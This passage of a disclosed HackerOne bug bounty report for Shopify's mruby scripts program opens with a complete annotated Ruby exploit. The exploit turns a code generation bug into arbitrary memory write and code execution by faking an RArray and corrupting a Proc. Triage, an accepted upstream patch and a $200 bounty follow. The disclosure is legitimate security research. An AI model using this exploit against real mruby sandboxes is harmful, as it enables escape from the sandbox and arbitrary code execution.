that:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# Setting up our helper functions.  Inspiration and a few code snippets taken\n# from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)\n\ndef hexchartonum(h)\n  numbase = \u0026quot;0\u0026quot;.getbyte(0)\n  letterbase = \u0026quot;a\u0026quot;.getbyte(0)\n  if h \u0026lt; (numbase + 10)\n    return h - numbase\n  else\n    return h - letterbase + 10\n  end\nend\n\ndef numtohexchar(b)\n  numbase = \u0026quot;0\u0026quot;.getbyte(0)\n  letterbase = \u0026quot;a\u0026quot;.getbyte(0)\n  if b \u0026lt; 10\n    return b + numbase\n  else\n    return b - 10 + letterbase\n  end\nend\n\ndef hextobytes(h)\n  p = \u0026quot;\\x00\u0026quot;*6\n  6.times do |i|\n    idx = i*2\n    b = hexchartonum(h.getbyte(idx))\n    b *= 16\n    b += hexchartonum(h.getbyte(idx + 1))\n    p.setbyte(5-i,b)\n  end\n  return p\nend\n\ndef bytestoint(p)\n  n = 0\n  4.times do |i|\n    n += p.getbyte(i) * (256**i)\n  end\n  return n\nend\n\ndef inttobytes(n)\n  p = \u0026quot;\\x00\u0026quot;*4\n  4.times do |i|\n    b = n% 256\n    p.setbyte(i,b)\n    n = n/256\n  end\n  return p\nend\n\ndef write(s, b, o=0)\n  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\nend\n\ndef addtostr(str, n)\n  str = str.dup\n  write(str, inttobytes(bytestoint(str.slice(0,4))+n))\n  return str\nend\n\n# Parse a Proc\u0026#39;s .to_s() and add leading zeroes.\ndef parseProcStr(s)\n  start = 9\n  finish = s.index(\u0026#39;@\u0026#39;)\n  slice = s.byteslice(start, finish-start)\n  addr = \u0026quot;0\u0026quot;*12\n  write(addr, slice, 12-slice.length)\n  return addr\nend\n\n# This is the heart of the exploit - our \u0026quot;clunky\u0026quot; write primitive.\ndef w(addr, value)\n  # This string is just small enough for its entire contents to be embedded\n  # in the RString.  This is good, since it gives us basically complete control\n  # over the RString\u0026#39;s contents.\n  #\n  # We use this complete control to impersonate an RArray.\n  # We start out with zeroes to make sure the length of the \u0026quot;RArray\u0026quot; is 0,\n  # and then use large numbers for \u0026#39;capa\u0026#39; to ensure that it won\u0026#39;t try to realloc.\n  # This string perfectly impersonates an RArray with length 0, large capa, and\n  # ptr set to `addr`, which is perfect for concatenating our data into.\n  x = \u0026quot;\\x00\\x00\\x00\\x00AAAAAAAAAAAA#{addr}\u0026quot;\n  # Here\u0026#39;s the kicker.  We load our fake RArray into R2, then we initiate an\n  # array constructor.\n  #\n  # Under ordinary circumstances, an array literal will push the elements of the\n  # array onto the stack one at a time, then construct the array from the elements\n  # all at once.\n  #\n  # However, if you splat another array into an array literal, the array literal\n  # construction will \u0026quot;cut off\u0026quot;.  It will construct a temporary array to hold\n  # the items collected so far, then it will add further elements using ARYCAT\n  # for splats and ARYPUSH otherwise.\n  #\n  # However, when, in place of a value, we use an assignment with unknown lhs,\n  # such as `_\u0026amp;.__=0x34343434`, this causes the stack to fail to get pushed.\n  # Two things happen as a result of the stack being one less than it should be.\n  #\n  # 1. Instead of containing [_\u0026amp;.__=0x34343434,value], the inner array is actually\n  # created using the temporary array that it was intending to concatenate onto.\n  # As a result, the inner array is generated containing [[], value].\n  #\n  # 2. Instead of being concatenated onto the temporary array, the inner array\n  # is concatenated directly onto R2, i.e. `a`, which is currently holding our\n  # RString impersonating an RArray.  Oops ;)\n  a=x\n  a = [*([_\u0026amp;.__=0x34343434,value])]\nend\n\n$overwritestr = \u0026quot;This string is long enough to not be counted as an embed.\u0026quot;\n# By modifying the string after creating it, we disable the sharing flag.\n$overwritestr.setbyte(0,41)\n\n# Now we want to locate the address of a string.  We\u0026#39;ll do so by taking the\n# absolute address of this proc and computing an offset using the object_id\n# method.  This will also handily set up a proc for us to corrupt later.\n$proc = Proc.new{|a|a*2}\n$procid = $proc.object_id^13\n$strid = $overwritestr.object_id^16\n$diff = $strid - $procid\n$prochexaddr = parseProcStr($proc.to_s)\n$procaddr = hextobytes($prochexaddr)\n$straddr = addtostr($procaddr, $diff)\n\n# Now we use our \u0026quot;clunky\u0026quot; write primitive to corrupt the string.  We write in\n# this way to put the address of proc in exactly the RString \u0026#39;ptr\u0026#39; field.\n# However, our write primitive is \u0026quot;clunky\u0026quot;, so it cannot write anything user-controlled\n# without writing some garbage first, and, at best, we can only control every\n# other 8 bytes.  It just so happens that the layout of data in an empty array\n# and the layout of the RString struct are helpfully organized so that we can\n# get a good number in the len field and also write to the ptr field without\n# corrupting too much other data.\nw(addtostr($straddr,24),$proc)\n\n# After corrupting $overwritestr, its ptr is now equal to the address of the\n# RProc structure. We can now freely use setbyte() calls on the str to modify\n# the RProc with perfect precision.\nwrite($overwritestr, \u0026quot;\\xFF\\xFF\u0026quot;,1) # Setting all flags to make it a CFunc\nwrite($overwritestr, \u0026quot;AAAAAAAA\u0026quot;, 24) # The address to call\n\n$proc.call # Winner winner chicken dinner :)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-05-07T16:57:38.001Z","updated_at":"2017-05-07T16:57:38.001Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1664240,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. This issue was reported by a number of researchers before you, and we opened the following report upstream: https://github.com/mruby/mruby/issues/3642\n\nNormally we would consider your report to be a duplicate, however you were the first researcher to have investigated the cause of the issue and proposed a solution, so we will consider splitting the reward with you once the issue is resolved.","markdown_message":"\u003cp\u003eThank you for your report. This issue was reported by a number of researchers before you, and we opened the following report upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3642\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3642\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3642\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNormally we would consider your report to be a duplicate, however you were the first researcher to have investigated the cause of the issue and proposed a solution, so we will consider splitting the reward with you once the issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-09T19:45:26.717Z","updated_at":"2017-05-09T19:45:26.717Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1674297,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. Your suggested patch was accepted upstream in https://github.com/mruby/mruby/pull/3656. Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. Your suggested patch was accepted upstream in \u003ca title=\"https://github.com/mruby/mruby/pull/3656\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3656\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/pull/3656\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-15T13:36:21.650Z","updated_at":"2017-05-15T13:36:21.650Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"avisaven","url":"/avisaven"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708038,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-29T19:24:04.844Z","updated_at":"2017-05-29T19:24:04.844Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"avisaven","url":"/avisaven"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708439,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T02:25:36.577Z","updated_at":"2017-05-30T02:25:36.577Z","first_to_agree":true,"actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1709650,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T14:36:40.264Z","updated_at":"2017-05-30T14:36:40.264Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1709651,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T14:36:40.320Z","updated_at":"2017-05-30T14:36:40.320Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1709669,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome! Thanks so much for everything!","markdown_message":"\u003cp\u003eAwesome! Thanks so much for everything!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-30T14:38:30.557Z","updated_at":"2017-05-30T14:38:30.557Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3988,"category":"researcher","content":"Improper code generation and error handling in OP_ASGN leads to arbitrary memory write and code execution.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eImproper code generation and error handling in OP_ASGN leads to arbitrary memory write and code execution.\u003c/p\u003e\n"}]}